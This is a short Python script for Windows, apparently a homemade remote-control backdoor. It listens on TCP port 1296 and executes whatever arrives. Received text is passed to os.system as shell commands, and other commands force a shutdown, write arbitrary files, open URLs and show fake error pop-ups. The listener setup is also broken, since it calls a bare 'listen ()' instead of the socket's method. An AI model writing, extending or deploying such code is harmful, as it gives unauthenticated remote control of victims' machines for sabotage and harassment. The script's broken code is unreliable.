import socket
import os         
import webbrowser
import ctypes



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 1296))    
listen ()

i = 0
b = 'cd'
while True:
    user_socket,address=server.accept() 
    while True:
        data=user_socket.recv(5000)
        dat=(data.decode('utf-8'))
        print(data.decode('utf-8'))
        # Commands
        if dat=='y':
            webbrowser.open('https://www.youtube.com/watch?v=jscrm8Mk9Zc')
            dat=0
        elif dat=='shd':
            os.system('shutdown -s -t 1')
        elif dat == 'txt':   
            data = user_socket.recv(5000)
            dat = (data.decode('utf-8'))
            file = open(dat, "w")
            data = user_socket.recv(5000)
            dat = (data.decode('utf-8'))
            file.write(dat)
            file.close()
        elif dat == 'url':
            data = user_socket.recv(5000)
            dat = (data.decode('utf-8'))
            webbrowser.open(dat)
            os.system(dat) 
        elif dat=='er':
            data = user_socket.recv(5000)
            info = (data.decode('utf-8'))
            ctypes.windll.user32.MessageBoxW(None, info,"Error" , 0)
        elif dat=='ert':
            data = user_socket.recv(5000)
            title = (data.decode('utf-8'))
            data = user_socket.recv(5000)
            info = (data.decode('utf-8'))
            ctypes.windll.user32.MessageBoxW(None, info,title , 0)
        else:
            os.system(dat)
            

        
    
        
        
   
